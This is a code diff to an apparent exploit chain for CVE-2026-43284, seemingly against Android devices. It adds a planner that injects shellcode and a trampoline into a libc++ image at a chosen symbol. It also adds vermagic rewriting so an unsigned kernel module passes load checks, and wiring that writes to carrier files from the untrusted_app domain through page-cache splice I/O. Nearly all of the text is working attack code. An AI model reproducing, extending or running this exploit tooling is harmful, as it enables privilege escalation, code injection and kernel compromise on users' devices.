@@ -5,6 +5,10 @@
 #include "backend/cve_2026_43284/session_frame.hpp"
 #include "support/run_state.hpp"
 
+#include <array>
+#include <cerrno>
+#include <cstddef>
+#include <cstdint>
 #include <cstdio>
 #include <cstring>
 #include <limits>
@@ -129,6 +133,69 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
             return fd;
         }
 #endif
+
+        /* Conservative AArch64 PC-relative test for the displaced instruction.
+         * The staged plan replays that word from the shellcode payload, so any
+         * encoding whose result depends on its own PC cannot be relocated and
+         * is rejected. The masks cover B/BL, B.cond, CBZ/CBNZ, TBZ/TBNZ,
+         * ADR/ADRP and LDR-literal; over-rejection is the fail-closed
+         * direction. */
+        [[nodiscard]] constexpr bool is_pc_relative_instruction(
+                std::uint32_t word) noexcept {
+            if ((word & 0x7C000000U) == 0x14000000U) return true; /* B / BL */
+            if ((word & 0xFF000010U) == 0x54000000U) return true; /* B.cond */
+            if ((word & 0x7E000000U) == 0x34000000U) return true; /* CBZ/CBNZ */
+            if ((word & 0x7E000000U) == 0x36000000U) return true; /* TBZ/TBNZ */
+            if ((word & 0x1F000000U) == 0x10000000U) return true; /* ADR/ADRP */
+            if ((word & 0x3B000000U) == 0x18000000U) return true; /* LDR literal */
+            return false;
+        }
+
+        /* Appends 0x + lowercase hex, zero-padded to at least min_digits. */
+        void append_hex(std::string &out, std::uint64_t value,
+                        std::size_t min_digits) {
+            static const char kDigits[] = "0123456789abcdef";
+            char buf[16];
+            std::size_t count = 0U;
+            do {
+                buf[count++] = kDigits[value & 0xFU];
+                value >>= 4U;
+            } while (value != 0U);
+            out += "0x";
+            for (std::size_t i = count; i < min_digits; ++i) {
+                out.push_back('0');
+            }
+            while (count > 0U) {
+                out.push_back(buf[--count]);
+            }
+        }
+
+        /* Read surface over the already-loaded hook image: the plan path never
+         * re-reads the file, and the write face refuses every call so a plan
+         * run cannot write a byte. */
+        struct PlanImageReadContext final {
+            const std::uint8_t *data = nullptr;
+            std::size_t size = 0U;
+        };
+
+        long plan_image_read16(void *raw, std::uint64_t offset,
+                               std::uint8_t out[16]) noexcept {
+            if (raw == nullptr || out == nullptr) {
+                return -EINVAL;
+            }
+            const auto *ctx = static_cast<const PlanImageReadContext *>(raw);
+            if (ctx->data == nullptr || offset > ctx->size ||
+                ctx->size - static_cast<std::size_t>(offset) < 16U) {
+                return -EIO;
+            }
+            std::memcpy(out, ctx->data + static_cast<std::size_t>(offset), 16U);
+            return 16;
+        }
+
+        std::int32_t plan_write_refused(void *, std::uint64_t,
+                                        const void *) noexcept {
+            return -EROFS;
+        }
     } // namespace
 
     std::string_view stage_name(Stage stage) noexcept {
@@ -172,6 +239,9 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
             case StageError::WaitRejected: return "WaitRejected";
             case StageError::KsudFailed: return "KsudFailed";
             case StageError::CleanupRejected: return "CleanupRejected";
+            case StageError::HookReadFailed: return "HookReadFailed";
+            case StageError::HookImageTooLarge: return "HookImageTooLarge";
+            case StageError::HookPlanFailed: return "HookPlanFailed";
         }
         return "Unknown";
     }
@@ -235,21 +305,214 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
         return true;
     }
 
+    std::string_view hook_error_name(steps::HookPatchError error) noexcept {
+        switch (error) {
+            case steps::HookPatchError::None: return "None";
+            case steps::HookPatchError::NullImage: return "NullImage";
+            case steps::HookPatchError::ImageTooSmall: return "ImageTooSmall";
+            case steps::HookPatchError::TargetNotFound: return "TargetNotFound";
+            case steps::HookPatchError::GuardRejected: return "GuardRejected";
+            case steps::HookPatchError::ShellcodeBuildFailed:
+                return "ShellcodeBuildFailed";
+            case steps::HookPatchError::ShellcodeBufferTooSmall:
+                return "ShellcodeBufferTooSmall";
+            case steps::HookPatchError::PlanFailed: return "PlanFailed";
+            case steps::HookPatchError::IoUnavailable: return "IoUnavailable";
+            case steps::HookPatchError::ReadFailed: return "ReadFailed";
+            case steps::HookPatchError::WriteFailed: return "WriteFailed";
+            case steps::HookPatchError::InvalidPlan: return "InvalidPlan";
+            case steps::HookPatchError::NotApplied: return "NotApplied";
+        }
+        return "Unknown";
+    }
+
+    std::string_view hook_guard_name(steps::HookGuardPolicy guard) noexcept {
+        return guard == steps::HookGuardPolicy::Reject ? "reject" : "skip";
+    }
+
+    bool plan_staged_hook(const StagedHookRequest &request,
+                          StagedHookPlan &out) noexcept {
+        out = StagedHookPlan{};
+        out.attempted = true;
+        out.target = request.hook_target;
+        out.symbol = request.symbol;
+        out.guard = request.guard;
+
+        /* Default to the embedded upstream libcxx.S template, both when the
+         * caller supplies no template and when the value slots must be bound
+         * from the carrier path. */
+        steps::ShellcodeTemplate default_template{};
+        steps::ShellcodeBinding default_bindings[steps::kLibcxxValueSlotCount]{};
+        std::size_t default_binding_count = 0U;
+        const steps::ShellcodeTemplate *tmpl = request.tmpl;
+        const steps::ShellcodeBinding *bindings = request.bindings;
+        std::size_t binding_count = request.binding_count;
+        std::size_t displaced_slot = request.displaced_slot;
+        if (tmpl == nullptr) {
+            steps::LibcxxHookBindings libcxx{};
+            libcxx.carrier_path = request.carrier_path;
+            steps::ShellcodeError binding_error = steps::ShellcodeError::None;
+            if (!steps::make_libcxx_hook_bindings(libcxx, default_bindings,
+                                                  default_binding_count,
+                                                  binding_error)) {
+                out.error = StageError::HookPlanFailed;
+                out.hook_error = steps::HookPatchError::ShellcodeBuildFailed;
+                return false;
+            }
+            default_template = steps::libcxx_shellcode_template();
+            tmpl = &default_template;
+            bindings = default_bindings;
+            binding_count = default_binding_count;
+            displaced_slot = steps::kLibcxxSlotDisplaced;
+        }
+
+        steps::HookPatchPlan plan{};
+        steps::HookPatchError error = steps::HookPatchError::None;
+        if (!steps::plan_hook_patch(
+                    request.image, request.image_size, request.symbol, request.guard,
+                    *tmpl, bindings, binding_count, displaced_slot,
+                    request.shellcode_buf, request.shellcode_cap,
+                    request.shellcode_orig_buf, request.io, plan, error)) {
+            out.error = StageError::HookPlanFailed;
+            out.hook_error = error;
+            return false;
+        }
+
+        /* The displaced word is replayed from the payload; a PC-relative word
+         * would execute against the wrong PC, so the staged plan fails closed
+         * before any write path can be armed. */
+        if (is_pc_relative_instruction(plan.hook.displaced_instruction)) {
+            out.steal_unsafe = true;
+            out.error = StageError::HookPlanFailed;
+            out.hook_error = steps::HookPatchError::None;
+            return false;
+        }
+
+        out.valid = true;
+        out.error = StageError::None;
+        out.hook_error = steps::HookPatchError::None;
+        out.hook_file_offset = plan.hook.hook_file_offset;
+        out.hook_vaddr = plan.hook.hook_vaddr;
+        out.displaced_instruction = plan.hook.displaced_instruction;
+        out.guard_instruction = plan.hook.guard_instruction;
+        out.guard_skipped = plan.hook.guard_skipped;
+        out.shellcode_file_offset = plan.hook.shellcode_file_offset;
+        out.shellcode_vaddr = plan.hook.shellcode_vaddr;
+        out.shellcode_len = plan.shellcode_size;
+        out.payload_max = plan.hook.payload_max_bytes;
+        out.trampoline_offset = plan.trampoline_offset;
+        out.trampoline_pos = plan.trampoline_pos;
+        out.trampoline_len = steps::kHookTrampolineBytes;
+        return true;
+    }
+
+    bool read_hook_image(std::string_view path, std::size_t max_bytes,
+                         std::vector<std::uint8_t> &out, StageError &error) {
+        out.clear();
+        error = StageError::None;
+        if (path.empty() || max_bytes == 0U) {
+            error = StageError::HookReadFailed;
+            return false;
+        }
+        const std::string native_path(path);
+        std::FILE *file = std::fopen(native_path.c_str(), "rb");
+        if (file == nullptr) {
+            error = StageError::HookReadFailed;
+            return false;
+        }
+        if (std::fseek(file, 0, SEEK_END) != 0) {
+            (void)std::fclose(file);
+            error = StageError::HookReadFailed;
+            return false;
+        }
+        const long size = std::ftell(file);
+        if (size <= 0 || static_cast<std::uint64_t>(size) > max_bytes) {
+            (void)std::fclose(file);
+            error = size <= 0 ? StageError::HookReadFailed
+                              : StageError::HookImageTooLarge;
+            return false;
+        }
+        if (std::fseek(file, 0, SEEK_SET) != 0) {
+            (void)std::fclose(file);
+            error = StageError::HookReadFailed;
+            return false;
+        }
+        const std::size_t bytes = static_cast<std::size_t>(size);
+        out.assign(bytes, 0U);
+        const std::size_t read = std::fread(out.data(), 1U, bytes, file);
+        (void)std::fclose(file);
+        if (read != bytes) {
+            out.clear();
+            error = StageError::HookReadFailed;
+            return false;
+        }
+        return true;
+    }
+
     bool precheck_staged_module(std::string_view module_path,
-                                std::string_view release, lkm::ModuleFacts &facts,
+                                const lkm::DeviceKernelFacts &required,
+                                lkm::ModuleFacts &facts,
                                 lkm::LkmImageError &error) noexcept {
         facts = lkm::ModuleFacts{};
         error = lkm::LkmImageError::None;
-        if (module_path.empty() || release.empty()) {
+        if (module_path.empty()) {
             error = lkm::LkmImageError::ReadFailed;
             return false;
         }
-        lkm::KernelRelease parsed{};
-        if (!lkm::parse_kernel_release(release, parsed)) {
+        return lkm::precheck_module_file(module_path, required, facts, error);
+    }
+
+    bool reconcile_module_vermagic(std::uint8_t *image, std::size_t image_size,
+                                   const lkm::DeviceKernelFacts &required,
+                                   bool allow_rewrite, lkm::ModuleFacts &facts,
+                                   lkm::VermagicOutcome &outcome,
+                                   lkm::LkmImageError &error) noexcept {
+        facts = lkm::ModuleFacts{};
+        outcome = lkm::VermagicOutcome::Unchecked;
+        error = lkm::LkmImageError::None;
+        if (image == nullptr) {
             error = lkm::LkmImageError::ReadFailed;
             return false;
         }
-        return lkm::precheck_module_file(module_path, parsed, facts, error);
+        lkm::ModuleFacts observed{};
+        if (lkm::precheck_module_bytes(image, image_size, required, observed, error)) {
+            facts = observed;
+            outcome = lkm::VermagicOutcome::Original;
+            return true;
+        }
+        /* Only a pure vermagic mismatch is rewritable; every other precheck
+         * failure (bad ELF, non-empty __versions, signature, ...) stays fatal
+         * exactly as before. */
+        if (error != lkm::LkmImageError::VermagicMismatch || !observed.has_vermagic) {
+            return false;
+        }
+        if (!allow_rewrite) {
+            facts = observed;
+            outcome = lkm::VermagicOutcome::Required;
+            return false;
+        }
+        char required_text[lkm::kVermagicMaxBytes] = {};
+        std::size_t required_len = 0U;
+        if (!lkm::required_vermagic(required, required_text, sizeof(required_text),
+                                    required_len)) {
+            facts = observed;
+            error = lkm::LkmImageError::VermagicMissing;
+            return false;
+        }
+        if (!lkm::rewrite_vermagic(image, image_size,
+                                   std::string_view(required_text, required_len), error)) {
+            facts = observed;
+            return false;
+        }
+        lkm::ModuleFacts rewritten{};
+        if (!lkm::precheck_module_bytes(image, image_size, required, rewritten, error)) {
+            facts = rewritten;
+            return false;
+        }
+        rewritten.vermagic_rewritten = true;
+        facts = rewritten;
+        outcome = lkm::VermagicOutcome::Rewritten;
+        return true;
     }
 
     StageReport run_stage(Stage stage, const steps::ChainRequest &request,
@@ -351,6 +614,8 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
             append_bool(status, report.wrote);
             status += " verified=";
             append_bool(status, report.verified);
+            status += " ko_vermagic=";
+            status += lkm::vermagic_outcome_name(report.vermagic);
             append_event(out, "run.module", status);
         }
         {
@@ -368,6 +633,47 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
             status += " preimage=";
             status += report.preimage_ok ? "ok" : "absent";
             append_event(out, "run.target", status);
+        }
+        if (report.hook.attempted) {
+            /* Read-only hook-plan diagnostics (B5-9h-1): the site, the stolen
+             * word, the shellcode/trampoline geometry and the fail-closed
+             * outcome. hook_steal is the displaced instruction word. */
+            const StagedHookPlan &hook = report.hook;
+            std::string status("hook_target=");
+            status += hook.target.empty() ? std::string_view("-") : hook.target;
+            status += " hook_symbol=";
+            status += hook.symbol.empty() ? std::string_view("-") : hook.symbol;
+            status += " hook_guard=";
+            status += hook_guard_name(hook.guard);
+            status += " hook_vma=";
+            append_hex(status, hook.hook_vaddr, 1U);
+            status += " hook_offset=";
+            append_hex(status, hook.hook_file_offset, 1U);
+            status += " hook_steal=";
+            append_hex(status, hook.displaced_instruction, 8U);
+            status += " guard_inst=";
+            append_hex(status, hook.guard_instruction, 8U);
+            status += " guard_skipped=";
+            append_bool(status, hook.guard_skipped);
+            status += " shellcode_len=";
+            status += std::to_string(hook.shellcode_len);
+            status += " shellcode_vma=";
+            append_hex(status, hook.shellcode_vaddr, 1U);
+            status += " shellcode_offset=";
+            append_hex(status, hook.shellcode_file_offset, 1U);
+            status += " payload_max=";
+            status += std::to_string(hook.payload_max);
+            status += " trampoline_len=";
+            status += std::to_string(hook.trampoline_len);
+            status += " trampoline_offset=";
+            append_hex(status, hook.trampoline_offset, 1U);
+            status += " trampoline_pos=";
+            status += std::to_string(hook.trampoline_pos);
+            status += " hook_error=";
+            status += hook.steal_unsafe
+                              ? std::string_view("StealUnsafe")
+                              : hook_error_name(hook.hook_error);
+            append_event(out, "run.hook", status);
         }
         {
             /* Explicit misuse guard: the dev-only non-vendor carrier hatch is
@@ -452,16 +758,30 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
             case StageError::NotReady:
             case StageError::SessionRejected:
             case StageError::KsudFailed:
+            case StageError::HookReadFailed:
+            case StageError::HookImageTooLarge:
+            case StageError::HookPlanFailed:
                 return 2;
         }
         return 2;
     }
 
-    int run_stage_cli(std::string_view module_path, std::string_view target_path,
-                      Stage stage, bool allow_dev_target) {
+    int run_stage_cli(const StagedRunOptions &options) {
+        const std::string_view module_path = options.module_path;
+        const std::string_view target_path = options.target_path;
+        const Stage stage = options.stage;
+        const bool allow_dev_target = options.allow_dev_target;
         if (module_path.empty() || target_path.empty()) {
             return 1;
         }
+        /* The carrier is separate from the patch #1 target: it defaults to the
+         * positional target so the pre-B5-9h-1 invocation is unchanged. */
+        const std::string carrier_path = options.carrier_path.empty()
+                                                 ? std::string(target_path)
+                                                 : std::string(options.carrier_path);
+        const std::string hook_target(options.hook_target);
+        const std::string hook_symbol(options.hook_symbol);
+        const std::string patch1_target(options.patch1_target);
 
         PlanBuffer plan{};
         StageError plan_error = StageError::None;
@@ -475,7 +795,7 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
         }
 
         steps::CarrierTarget carrier{};
-        carrier.path = target_path;
+        carrier.path = carrier_path;
         carrier.size = 0U;
         steps::ChainRequest request{};
         request.carriers = &carrier;
@@ -485,11 +805,48 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
         request.allow_dev_carrier_path = allow_dev_target;
 
         if (stage == Stage::Plan) {
-            /* No device binding and no write: the plan is validated and printed. */
+            /* Read-only: the module/carrier plan is validated and the libc++
+             * hook plan is computed over an in-memory image. No device op is
+             * bound and the write face is a refuse-only stub, so a plan run can
+             * not write a byte. */
             steps::ChainOps ops{};
             steps::ChainWorkspace workspace{};
-            const StageReport report = run_stage(stage, request, ops, workspace);
-            emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
+            StageReport report = run_stage(stage, request, ops, workspace);
+            if (report.error == StageError::None) {
+                std::vector<std::uint8_t> image{};
+                StageError image_error = StageError::None;
+                if (!read_hook_image(hook_target, steps::kElfMaxImageBytes, image,
+                                     image_error)) {
+                    report.error = image_error;
+                    report.hook.attempted = true;
+                    report.hook.target = hook_target;
+                    report.hook.symbol = hook_symbol;
+                    report.hook.guard = options.hook_guard;
+                } else {
+                    PlanImageReadContext read_ctx{image.data(), image.size()};
+                    steps::HookPatchIo io{};
+                    io.ctx = &read_ctx;
+                    io.read16 = &plan_image_read16;
+                    io.write16 = &plan_write_refused;
+                    std::array<std::uint8_t, steps::kShellcodeMaxBytes> shell{};
+                    std::array<std::uint8_t, steps::kShellcodeMaxBytes> shell_orig{};
+                    StagedHookRequest hook_request{};
+                    hook_request.image = image.data();
+                    hook_request.image_size = image.size();
+                    hook_request.hook_target = hook_target;
+                    hook_request.symbol = hook_symbol;
+                    hook_request.guard = options.hook_guard;
+                    hook_request.carrier_path = carrier_path;
+                    hook_request.io = io;
+                    hook_request.shellcode_buf = shell.data();
+                    hook_request.shellcode_cap = shell.size();
+                    hook_request.shellcode_orig_buf = shell_orig.data();
+                    if (!plan_staged_hook(hook_request, report.hook)) {
+                        report.error = StageError::HookPlanFailed;
+                    }
+                }
+            }
+            emit(format_stage_report(report, module_path, carrier_path, plan.module_bytes));
             return stage_exit_code(report);
         }
 
@@ -501,29 +858,50 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
         emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
         return stage_exit_code(report);
 #else
-        /* B5-4 fail-closed precheck before patch #2: the .ko must match the
-         * running KMI (ELF/.modinfo name, vermagic, empty __versions, unsigned).
-         * No module is loaded here. */
+        /* B5-4/B5-9h-3 fail-closed precheck before patch #2: the exact bytes the
+         * plan will write must match the required KMI vermagic (ELF/.modinfo
+         * name, full vermagic, empty __versions, unsigned). When only the
+         * vermagic differs and the explicit rewrite policy is on, the in-memory
+         * image is rewritten and re-verified; no module is loaded here. */
+        lkm::VermagicOutcome vermagic_outcome = lkm::VermagicOutcome::Unchecked;
         {
             char release_buf[platform::kDeviceReleaseMax] = {};
+            char proc_buf[platform::kDeviceProcVersionMax] = {};
             const platform::DeviceProbeOps probe = platform::real_device_probe();
             long release_len = -1;
             if (probe.read_release != nullptr) {
                 release_len = probe.read_release(probe.ctx, release_buf,
                                                  sizeof(release_buf));
             }
-            const std::string_view release =
+            long proc_len = -1;
+            if (probe.read_proc_version != nullptr) {
+                proc_len = probe.read_proc_version(probe.ctx, proc_buf,
+                                                   sizeof(proc_buf));
+            }
+            lkm::DeviceKernelFacts required{};
+            required.release =
                     release_len > 0
                             ? std::string_view(release_buf,
                                                static_cast<std::size_t>(release_len))
                             : std::string_view{};
+            required.preempt =
+                    proc_len > 0 &&
+                    lkm::proc_version_has_preempt(std::string_view(
+                            proc_buf, static_cast<std::size_t>(proc_len)));
+            /* modversions/module_force_unload keep the DeviceKernelFacts
+             * audited-target defaults: they are not probeable from userspace
+             * and the rewrite stays off by default. */
             lkm::ModuleFacts facts{};
             lkm::LkmImageError lkm_error = lkm::LkmImageError::None;
-            if (!precheck_staged_module(module_path, release, facts, lkm_error)) {
+            if (!reconcile_module_vermagic(plan.bytes.data(),
+                                           static_cast<std::size_t>(plan.module_bytes),
+                                           required, options.allow_vermagic_rewrite,
+                                           facts, vermagic_outcome, lkm_error)) {
                 StageReport report{};
                 report.stage = stage;
                 report.dev_target = allow_dev_target;
                 report.error = StageError::ModulePrecheckFailed;
+                report.vermagic = vermagic_outcome;
                 emit(format_stage_report(report, module_path, target_path,
                                          plan.module_bytes));
                 return stage_exit_code(report);
@@ -538,12 +916,12 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
             report.stage = stage;
             report.dev_target = allow_dev_target;
             report.error = StageError::SessionRejected;
+            report.vermagic = vermagic_outcome;
             emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
             return stage_exit_code(report);
         }
 
-        const std::string target(target_path);
-        const int target_fd = ::open(target.c_str(), O_RDONLY | O_CLOEXEC);
+        const int target_fd = ::open(carrier_path.c_str(), O_RDONLY | O_CLOEXEC);
 
         /* Boundary surface: the real target size from fstat(2), asserted against
          * every planned region before a byte is written. A target the App could
@@ -563,7 +941,7 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
         ctx.page.io = pagecache::real_splice_io();
         ctx.device = platform::real_device_probe();
         ctx.trigger_delay_ms = 500U;
-        ctx.target_path = target.c_str();
+        ctx.target_path = carrier_path.c_str();
         ctx.allow_dev_carrier_path = allow_dev_target;
         ctx.bridge = steps::real_crash_dump_bridge();
 
@@ -575,12 +953,13 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
          * other open failure stays fatal. */
         const bool helper_carrier =
                 target_fd < 0 && !allow_dev_target && ctx.bridge.available() &&
-                steps::is_vendor_path(target);
+                steps::is_vendor_path(carrier_path);
         if (target_fd < 0 && !helper_carrier) {
             StageReport report{};
             report.stage = stage;
             report.dev_target = allow_dev_target;
             report.error = StageError::InvalidArgument;
+            report.vermagic = vermagic_outcome;
             emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
             return stage_exit_code(report);
         }
@@ -590,7 +969,7 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
         if (!allow_dev_target) {
             /* patch #1 target: app-readable in the untrusted_app domain. */
             ctx.crash_dump_fd =
-                    ::open(steps::kCrashDump64Path, O_RDONLY | O_CLOEXEC);
+                    ::open(patch1_target.c_str(), O_RDONLY | O_CLOEXEC);
         }
 
         if (ctx.page.socket_fd < 0) {
@@ -601,6 +980,7 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
             report.stage = stage;
             report.dev_target = allow_dev_target;
             report.error = StageError::NotReady;
+            report.vermagic = vermagic_outcome;
             emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
             return stage_exit_code(report);
         }
@@ -611,13 +991,15 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
             report.stage = stage;
             report.dev_target = allow_dev_target;
             report.error = StageError::NotReady;
+            report.vermagic = vermagic_outcome;
             emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
             return stage_exit_code(report);
         }
 
         const steps::ChainOps ops = make_real_chain_ops(ctx);
         steps::ChainWorkspace workspace{};
-        const StageReport report = run_stage(stage, request, ops, workspace);
+        StageReport report = run_stage(stage, request, ops, workspace);
+        report.vermagic = vermagic_outcome;
         if (!ctx.released) {
             /* A pre-chain rejection left the fds open; close them fail-closed. */
             real_chain_release(&ctx.page);
